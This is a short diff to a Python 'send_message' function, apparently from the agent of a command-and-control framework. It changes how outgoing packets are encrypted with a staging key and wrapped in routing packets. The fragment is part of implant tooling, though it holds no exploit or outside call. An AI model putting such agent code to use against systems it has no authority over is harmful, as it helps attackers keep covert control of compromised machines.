@@ -930,9 +930,9 @@ def send_message(packets=None):
     global taskURIs
     data = None
     if packets:
-        data = ''.join(packets.decode('latin-1'))
+        # data = ''.join(packets.decode('latin-1'))
         # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, data)
+        encData = aes_encrypt_then_hmac(key, packets)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
 
     else:
